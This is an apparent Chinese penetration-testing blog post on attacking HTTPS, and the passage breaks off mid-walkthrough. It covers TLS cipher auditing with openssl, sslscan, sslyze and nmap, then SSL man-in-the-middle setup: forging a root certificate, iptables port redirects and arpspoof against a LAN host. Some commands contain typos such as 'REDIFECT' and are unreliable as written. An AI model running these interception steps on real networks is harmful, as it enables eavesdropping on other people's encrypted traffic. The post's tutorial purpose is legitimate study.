@@ -1,0 +1,883 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>HTTPS攻击 - 剑胆琴心</title><meta name="author" content="剑胆琴心">
+<meta name="author-link" content="http://geoer.cn">
+<meta name="description" content="HTTPS攻击 防止恶意注入、DNS劫持 https的作用 C I A 解决的是信息传输过程中数据被篡改、窃取 加密：对称、非对称、单向(Hash) htt" /><meta name="keywords" content='渗透测试, HTTPS攻击' /><meta itemprop="name" content="HTTPS攻击">
+<meta itemprop="description" content="HTTPS攻击 防止恶意注入、DNS劫持 https的作用 C I A 解决的是信息传输过程中数据被篡改、窃取 加密：对称、非对称、单向(Hash) htt"><meta itemprop="datePublished" content="2020-03-29T12:25:30+08:00" />
+<meta itemprop="dateModified" content="2023-01-21T16:47:23+08:00" />
+<meta itemprop="wordCount" content="3749"><meta itemprop="image" content="https://geoer.cn/logo.png"/>
+<meta itemprop="keywords" content="渗透测试,HTTPS攻击," /><meta property="og:title" content="HTTPS攻击" />
+<meta property="og:description" content="HTTPS攻击 防止恶意注入、DNS劫持 https的作用 C I A 解决的是信息传输过程中数据被篡改、窃取 加密：对称、非对称、单向(Hash) htt" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://geoer.cn/https%E6%94%BB%E5%87%BB/" /><meta property="og:image" content="https://geoer.cn/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-03-29T12:25:30+08:00" />
+<meta property="article:modified_time" content="2023-01-21T16:47:23+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://geoer.cn/logo.png"/>
+
+<meta name="twitter:title" content="HTTPS攻击"/>
+<meta name="twitter:description" content="HTTPS攻击 防止恶意注入、DNS劫持 https的作用 C I A 解决的是信息传输过程中数据被篡改、窃取 加密：对称、非对称、单向(Hash) htt"/>
+<meta name="application-name" content="剑胆琴心">
+<meta name="apple-mobile-web-app-title" content="剑胆琴心"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://geoer.cn/https%E6%94%BB%E5%87%BB/" /><link rel="prev" href="https://geoer.cn/node-js-%E5%85%A5%E9%97%A8/" /><link rel="next" href="https://geoer.cn/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AE%A1%E9%81%93%E7%AC%A6/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "HTTPS攻击",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/geoer.cn\/https%E6%94%BB%E5%87%BB\/"
+    },"image": [{
+              "@type": "ImageObject",
+              "url": "https:\/\/geoer.cn\/images\/Apple-Devices-Preview.jpg",
+              "width":  1842 ,
+              "height":  1036 
+            }],"genre": "posts","keywords": "渗透测试, HTTPS攻击","wordcount":  3749 ,
+    "url": "https:\/\/geoer.cn\/https%E6%94%BB%E5%87%BB\/","datePublished": "2020-03-29T12:25:30+08:00","dateModified": "2023-01-21T16:47:23+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+      "@type": "Organization",
+      "name": "剑胆琴心","logo": {
+          "@type": "ImageObject",
+          "url": "https:\/\/geoer.cn\/images\/avatar.png",
+          "width":  438 ,
+          "height":  438 
+        }},"author": {
+        "@type": "Person",
+        "name": "剑胆琴心"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tests/"
+                title="FixIt 测试"
+                
+              ><i class="fa-solid fa-flask fa-fw fa-sm" aria-hidden="true"></i> 测试</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                title="友情链接"
+                
+              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="/images/avatar.png"
+    title="/images/avatar.png" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tests/"
+                  title="FixIt 测试"
+                  
+                ><i class="fa-solid fa-flask fa-fw fa-sm" aria-hidden="true"></i> 测试</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  title="友情链接"
+                  
+                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="https://github.com/shuai06"
+                  title="GitHub"
+                  rel="noopener noreferrer" target="_blank"
+                ><i class='fa-brands fa-github fa-fw' aria-hidden='true'></i> </a></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span>HTTPS攻击</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="http://geoer.cn" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img
+    class="lazyload avatar"
+    src="/svg/loading.min.svg"
+    data-src="https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp"
+    data-srcset="https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp, https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp 1.5x, https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心"/>&nbsp;剑胆琴心</a></span>
+          <span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 渗透测试</a></span></div>
+      <div class="post-meta-line"><span title=2020-03-29&#32;12:25:30><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2020-03-29">2020-03-29</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 3749 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 8 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="HTTPS攻击">
+              <i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
+            </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#https的作用">https的作用</a></li>
+            <li><a href="#https攻击方法">https攻击方法</a>
+              <ul>
+                <li><a href="#常识">常识</a></li>
+                <li><a href="#实践">实践</a>
+                  <ul>
+                    <li><a href="#1openssl命令">1.<code>openssl</code>命令</a></li>
+                    <li><a href="#2sslscan工具">2.<code>SSLScan</code>工具</a></li>
+                    <li><a href="#3sslyze工具">3.<code>SSLyze</code>工具</a></li>
+                    <li><a href="#4nmap">4.<code>Nmap</code></a></li>
+                    <li><a href="#5-在线网站">5. 在线网站：</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#概述">概述</a></li>
+            <li><a href="#利用">利用</a>
+              <ul>
+                <li><a href="#攻击的前提">攻击的前提</a></li>
+                <li><a href="#工具">工具</a>
+                  <ul>
+                    <li><a href="#1sslsplit工具">1.<code>SSLsplit</code>工具</a></li>
+                    <li><a href="#2mitmproxy工具">2.<code>Mitmproxy</code>工具</a></li>
+                    <li><a href="#3sslstrip工具">3.<code>SSLstrip</code>工具</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#ssltls拒绝服务攻击">SSL/TLS拒绝服务攻击</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#note">Note:</a></li>
+            <li><a href="#利用-1">利用</a>
+              <ul>
+                <li><a href="#thc-ssl-dos工具"><code>thc-ssl-dos</code>工具</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#补充概念">补充概念</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#ajax">Ajax</a></li>
+            <li><a href="#web-service">Web Service</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h1 id="https攻击">HTTPS攻击</h1>
+<p>防止恶意注入、DNS劫持</p>
+<h4 id="https的作用">https的作用</h4>
+<ul>
+<li>C I A</li>
+<li>解决的是信息<code>传输过程中</code>数据被篡改、窃取</li>
+<li>加密：对称、非对称、单向(Hash)</li>
+</ul>
+<h4 id="https攻击方法">https攻击方法</h4>
+<ul>
+<li>
+<p>降级攻击</p>
+</li>
+<li>
+<p>解密攻击（明文、证书伪造）&ndash; 劫持</p>
+</li>
+<li>
+<p>协议漏洞、实现方法的漏洞、配置不严格</p>
+</li>
+</ul>
+<h5 id="常识">常识</h5>
+<p><code>SSL</code>（安全套接层, Secure socket layer）,后来使用<code>TSL</code>取代了SSL，只不过习惯了叫SSL</p>
+<p><strong>SSL/TLS也被用于其他场景的传输通道加密：</strong></p>
+<ul>
+<li>邮件传输（服务器间、客户端与服务器间）</li>
+<li>数据库服务器间</li>
+<li>LDAP身份认证服务器间</li>
+<li>SSL VPN</li>
+<li>远程桌面RDP通信过程中的加密和身份认证</li>
+</ul>
+<p><strong>Web通信中SSL加密</strong></p>
+<ul>
+<li>公钥证书（受信任的第三方证书颁发机构签名颁发）</li>
+<li>常见的证书颁发机构：VeriSign、Thawte、GlobalSign、Symantec</li>
+</ul>
+<p>**加密过程：**握手、协商加密算法、获取公钥证书、交换会话秘钥、加密信息传输</p>
+<p><strong>非对称加密算法</strong></p>
+<p>非对称加密一般用来加密比较小的数据
+例如：RSA, ECC等</p>
+<p><strong>对称加密算法</strong></p>
+<p>DES/3DES, AES, IDEA, RC4 &hellip;&hellip;</p>
+<p><strong>单向加密算法(Hash)</strong></p>
+<table>
+<thead>
+<tr>
+<th>Hash算法</th>
+<th>Hash值长度(bit)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MD5</td>
+<td>128</td>
+</tr>
+<tr>
+<td>SHA-1</td>
+<td>160</td>
+</tr>
+<tr>
+<td>SHA-2</td>
+<td>224,256,384,512</td>
+</tr>
+</tbody>
+</table>
+<p><strong>SSL的弱点</strong></p>
+<ul>
+<li>SSL是不同的对称、非对称、单项加密算法的组合加密实现(<code>cipher suite</code>)</li>
+<li>服务器端为提供更好的兼容性，选择支持大量过时cipher suite</li>
+<li>协商过程中墙皮降级加密强度</li>
+<li>现代处理器计算能力可以在可接受的时间内破解过时加密算法</li>
+<li>购买云计算资源破解</li>
+</ul>
+<h5 id="实践">实践</h5>
+<blockquote>
+<p>查看web站点用了啥样的ssl协议，什么版本，什么组合</p>
+</blockquote>
+<h6 id="1openssl命令">1.<code>openssl</code>命令</h6>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">openssl s_client --connect www.baidu.com:443
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#证书颁发机构也是树形结构的，有一级二级</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#指定查看是否支持某协议和组合</span>
+</span></span><span class="line"><span class="cl">openssl s_client -tls1_2 -cipher <span class="s1">&#39;ECDHE-ECDSA-AES128-GCM-SHA256&#39;</span> -connect www.taobao.com:443
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 测试是否可以跟已知的不安全的cipher suite建立连接</span>
+</span></span><span class="line"><span class="cl">openssl s_client -tls1_2 -cipher <span class="s1">&#39;NULL,EXPORT,LOW,DES&#39;</span> -connect www.taobao.com:443
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 已知的不安全的组合cipher suite</span>
+</span></span><span class="line"><span class="cl">openssl ciphers -v <span class="s1">&#39;NULL,EXPORT,LOW,DES&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 参考网站（加密技术）</span>
+</span></span><span class="line"><span class="cl">https://www.openssl.org/docs/apps/ciphers.html
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_1.png"
+    data-srcset="http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_1.png, http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_1.png 1.5x, http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_1.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_1.png"
+    title="http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_1.png"/></p>
+<p>Openssl需要大量密码学相关知识，命令复杂，结果可读性差</p>
+<h6 id="2sslscan工具">2.<code>SSLScan</code>工具</h6>
+<ul>
+<li>自动识别ssl配置错误、过期协议、过时cipher suite和hash算法</li>
+<li>默认会检查CRIME、心脏出血漏洞</li>
+<li>绿色表示安全，红色黄色需要引起注意</li>
+</ul>
+<p>查看TLS支持的cipher suite</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 检查所有的支持的tls是否有不安全的</span>
+</span></span><span class="line"><span class="cl">sslscan --tlsall www.taobao.com:443
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Altnames选项下面的域名也可以使用上面域名的证书</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>分析证书详细信息</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sslscan --show-certificate -no-ciphersuites www.taobao.com:443
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="3sslyze工具">3.<code>SSLyze</code>工具</h6>
+<ul>
+<li>Python编写</li>
+<li>检查ssl过时版本</li>
+<li>检查存在弱点的cipher suite</li>
+<li>扫描多站点时，支持来源文件(多个站点放到一个文件里面)</li>
+<li>检查是否支持会话恢复</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sslyze --regular  www.supercomputerboytony.cn
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="4nmap">4.<code>Nmap</code></h6>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 枚举cipher suite</span>
+</span></span><span class="line"><span class="cl">nmap --script<span class="o">=</span>ssl-enum-ciphers.nse www.supercomputerboytony.cn
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="5-在线网站">5. 在线网站：</h6>
+<p>输入域名，对SSL进行检测
+<a href="https://www.ssllabs.com/ssltest"target="_blank" rel="external nofollow noopener noreferrer">https://www.ssllabs.com/ssltest<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<hr>
+<h1 id="ssl中间人攻击">SSL中间人攻击</h1>
+<h4 id="概述">概述</h4>
+<p>攻击者位于客户端和服务器通信链路中</p>
+<ul>
+<li>1.ARP欺骗（最常用）</li>
+<li>2.DHCP
+如果有另一台机器，比之前的dhcp服务器离用户更近，那么攻击者的机器就会更快响应(DHCP第一步是广播)</li>
+<li>3.修改网关</li>
+<li>4.修改DNS(如果控制了客户机, 直接修改客户机的dns配置)</li>
+<li>5.修改HOSTS</li>
+<li>6.ICMP、STP(二层的生成树协议)、OSPF(三层的开放式最短路径优先协议)  &mdash;&gt;如果处在同一局域网</li>
+</ul>
+<blockquote>
+<p>不仅是http和tcp/ip协议容易出现安全问题，底层的网络协议也存在很多问题，自己搭建环境练习</p>
+</blockquote>
+<p>加密流量</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_2.png"
+    data-srcset="http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_2.png, http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_2.png 1.5x, http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_2.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_2.png"
+    title="http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_2.png"/></p>
+<blockquote>
+<p>ps：下来的演示，是基于ARP欺骗的：</p>
+</blockquote>
+<h4 id="利用">利用</h4>
+<h5 id="攻击的前提">攻击的前提</h5>
+<ul>
+<li>客户端已经信任了伪造证书颁发机构</li>
+<li>攻击者控制了核发证书颁发机构（CA证书服务器）</li>
+<li>客户端程序禁止了显示证书错误告警信息</li>
+<li>攻击者已经控制客户端，并强制其信任伪造证书</li>
+</ul>
+<h5 id="工具">工具</h5>
+<p>对已经实现中间人欺骗(这里用<code>arpspoof</code>)后，下面的工具对信息进行解密</p>
+<h6 id="1sslsplit工具">1.<code>SSLsplit</code>工具</h6>
+<ul>
+<li>透明SSL/TLS中间人攻击工具</li>
+<li>对客户端伪装成服务器，对服务器伪装成普通客户端</li>
+<li>伪装服务器需要伪造证书（利用<code>openssl</code>来生成伪造的证书）</li>
+<li>支持ssl/tls加密的smtp、pop3、ftp等通信中间人攻击</li>
+</ul>
+<p><strong>1). openssl</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 1.利用openssl生成证书私钥</span>
+</span></span><span class="line"><span class="cl">openssl genrsa -out ca.key <span class="m">2048</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 2.利用私钥签名生成证书(生效时间,使用的私钥文件)  -- 这是根证书，不是一会使用的证书，用的证书是需要这个根证书来签名的</span>
+</span></span><span class="line"><span class="cl">openssl req -new -x509 -days <span class="m">1096</span> -key ca.key -out ca.crt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 下来输入一些信息即可（信息可以把之前扫描的信息添进来以保证看起来很真实）</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>2).攻击机器设置路由转发</strong>
+下面，当受害者的流量通过我的机器，我的机器来转发（需要我的系统来开启路由功能）：</p>
+<p>做个地址转换, 比如:  把我计算机443端口收到的数据包转发到8443端口</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 先查看要用到的端口有没有被占用</span>
+</span></span><span class="line"><span class="cl">netstst -pantu <span class="p">|</span>grep :80
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看nat表</span>
+</span></span><span class="line"><span class="cl">iptables -t nat -L
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># -F  清空</span>
+</span></span><span class="line"><span class="cl">iptables -t nat -F
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 端口转发命令（PREROUTING在路由之前,-p协议, -j操作）</span>
+</span></span><span class="line"><span class="cl">iptables -t nat -A PREROUTING -p tcp --dport <span class="m">80</span> -j REDIFECT --to-port <span class="m">8080</span>
+</span></span><span class="line"><span class="cl">iptables -t nat -A PREROUTING -p tcp --dport <span class="m">443</span> -j REDIFECT --to-port <span class="m">8443</span>
+</span></span><span class="line"><span class="cl">iptables -t nat -A PREROUTING -p tcp --dport <span class="m">587</span> -j REDIFECT --to-port <span class="m">8443</span>   <span class="c1"># MSA</span>
+</span></span><span class="line"><span class="cl">iptables -t nat -A PREROUTING -p tcp --dport <span class="m">465</span> -j REDIFECT --to-port <span class="m">8443</span>    <span class="c1"># SMTPS 发邮件</span>
+</span></span><span class="line"><span class="cl">iptables -t nat -A PREROUTING -p tcp --dport <span class="m">993</span> -j REDIFECT --to-port 8443	<span class="c1"># IMAPS    收邮件</span>
+</span></span><span class="line"><span class="cl">iptables -t nat -A PREROUTING -p tcp --dport <span class="m">995</span> -j REDIFECT --to-port <span class="m">8443</span> <span class="c1">#POP3S</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#其他使用ssl协议加密的协议端口一样</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">iptables -L
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>3).ARP欺骗</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># -i本地网卡 -t要欺骗的目标， -r:让他认为网关192.168.1.1的mac地址是我本机的mac地址</span>
+</span></span><span class="line"><span class="cl">arpspoof -i eth0 -t 192.168.1.118 -r 192.168.1.1
+</span></span><span class="line"><span class="cl">
